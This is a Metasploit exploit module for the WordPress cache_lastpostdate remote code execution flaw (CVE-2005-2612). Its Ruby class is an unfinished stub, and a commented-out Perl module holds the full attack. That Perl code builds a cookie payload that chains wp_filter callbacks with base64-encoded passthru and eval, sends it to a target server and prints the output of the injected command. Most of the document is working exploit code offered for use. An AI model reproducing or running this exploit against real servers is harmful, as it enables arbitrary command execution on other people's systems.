require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'WordPress cache_lastpostdate Arbitrary Code Execution',
			'Description'    => %q{
				This module exploits an arbitrary PHP code execution flaw in
				the WordPress blogging software. This vulnerability is only
				present when the PHP 'register_globals' option is enabled
				(common for hosting providers). All versions of WordPress
				prior to 1.5.1.3 are affected.
					
			},
			'Author'         => [ 'str0ke <str0ke@milw0rm.com>' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '18672'],
					[ 'CVE', '2005-2612'],
					[ 'BID', '14533'],
					[ 'MIL', '86'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Aug 9 2005',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin
##
#        Title:  Wordpress <= 1.5.1.3 Remote Code Execution eXploit (metasploit)
#    Name: php_wordpress.pm
# License: Artistic/BSD/GPL
#         Info: I lub metasploit yummmm (str0ke ! milw0rm.com).
#
# Recoded Kartoffelguru's php code for metasploit.  I love cookies. /str0ke
#
#
#
#  - This is an exploit module for the Metasploit Framework, please see
#     http://metasploit.com/projects/Framework for more information.
#
##

package Msf::Exploit::php_wordpress_lastpost;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info = {
	'Name'     => 'WordPress cache_lastpostdate Arbitrary Code Execution',
	'Version'  => '$Revision$',
	'Authors'  => [ 'str0ke < str0ke [at] milw0rm.com >' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'RPATH' => [1, 'DATA', 'Path WordPress root directory', '/'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
            This module exploits an arbitrary PHP code execution flaw in the WordPress
		blogging software. This vulnerability is only present when the PHP 'register_globals'
		option is enabled (common for hosting providers). All versions of WordPress prior to
		1.5.1.3 are affected.
}),

	'Refs' =>
	  [
		['OSVDB', '18672'],
		['CVE', '2005-2612'],
		['BID', '14533'],
		['MIL', '86'],
	  ],

	'Payload' =>
	  {
		'Space' => 512,
		'Keys'  => ['cmd', 'cmd_bash'],
	  },

	'Keys' => ['wordpress'],

	'DisclosureDate' => 'Aug 9 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $target_port    = $self->GetVar('RPORT');
	my $vhost          = $self->GetVar('VHOST') || $target_host;
	my $path           = $self->GetVar('RPATH');
	my $cmd            = $self->GetVar('EncodedPayload')->RawPayload;

	# Add an echo on each end for easy output capturing
	$cmd = "echo _cmd_beg_;".$cmd.";echo _cmd_end_";

	my $encoded = Pex::Text::Base64Encode("passthru(\"$cmd\");", '');

	my $byte = join('.', map { $_ = 'chr('.$_.')' } unpack('C*', $encoded));
	$byte .= ".chr(32)";

	my $str = Pex::Text::Base64Encode('args[0]=eval(base64_decode('.$byte.')).die()&args[1]=x', '');

	my $data = "wp_filter[query_vars][0][0][function]=get_lastpostdate;wp_filter[query_vars][0][0][accepted_args]=0;".
	  "wp_filter[query_vars][0][1][function]=base64_decode;wp_filter[query_vars][0][1][accepted_args]=1;".
	  "cache_lastpostmodified[server]=//e;cache_lastpostdate[server]=$str".
	  ";wp_filter[query_vars][1][0][function]=parse_str;wp_filter[query_vars][1][0][accepted_args]=1;".
	  "wp_filter[query_vars][2][0][function]=get_lastpostmodified;wp_filter[query_vars][2][0][accepted_args]=0;".
	  "wp_filter[query_vars][3][0][function]=preg_replace;wp_filter[query_vars][3][0][accepted_args]=3;";

	my $req =
	  "GET $path HTTP/1.0\r\n".
	  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)\r\n".
	  "Host: $vhost:$target_port\r\n".
	  "Pragma: no-cache\r\n".
	  "Accept: */*\r\n".
	  "Cookie: $data\r\n".
	  "\r\n";

	my $s = Msf::Socket::Tcp->new(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),

	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Sending the malicious WordPress request...");

	$s->Send($req);

	my $results = $s->Recv(-1, 20);
	$s->Close();

	if ($results =~ m/_cmd_beg_(.*)_cmd_end_/ms) {
		my $out = $1;
		$out =~ s/^\s+|\s+$//gs;
		if ($out) {
			$self->PrintLine('----------------------------------------');
			$self->PrintLine('');
			$self->PrintLine($out);
			$self->PrintLine('');
			$self->PrintLine('----------------------------------------');
		}
	}
	return;
}

1;


=end


end
end	
